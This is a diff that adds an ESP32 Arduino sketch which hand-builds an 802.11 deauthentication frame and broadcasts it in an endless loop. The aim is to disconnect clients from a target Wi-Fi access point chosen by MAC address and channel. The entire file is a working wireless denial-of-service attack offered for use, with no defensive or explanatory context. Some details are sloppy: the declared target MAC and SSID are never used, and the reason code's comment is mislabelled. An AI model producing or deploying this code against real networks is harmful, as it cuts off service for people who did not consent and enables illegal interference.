@@ -1,0 +1,45 @@
+#include <WiFi.h>
+#include "esp_wifi.h"
+
+// Target SSID and MAC address
+const char *targetSSID = "TargetWiFi";
+uint8_t targetMAC[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF}; // Replace with the target device's MAC address
+
+// Deauth frame template
+uint8_t deauthPacket[26] = {
+  0xC0, 0x00, // Frame Control (Deauthentication)
+  0x00, 0x00, // Duration
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver address (Broadcast)
+  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, // Source address (Target AP)
+  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, // BSSID (Target AP)
+  0x00, 0x00, // Sequence Number
+  0x07, 0x00, // Reason Code (unspecified)
+};
+
+void setup() {
+  Serial.begin(115200);
+  WiFi.mode(WIFI_MODE_STA); // Station mode
+  delay(100);
+  
+  Serial.println("Starting deauthentication...");
+  
+  // Set Wi-Fi channel to the target AP's channel
+  int channel = 1; // Replace with the actual channel
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+
+  // Continuously send deauth packets
+  while (true) {
+    sendDeauthPackets();
+  }
+}
+
+void sendDeauthPackets() {
+  // Send packets using ESP-IDF's low-level transmission API
+  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+  Serial.println("Deauth packet sent");
+  delay(100); // Adjust delay as needed
+}
+
+void loop() {
+  // Intentionally left empty
+}
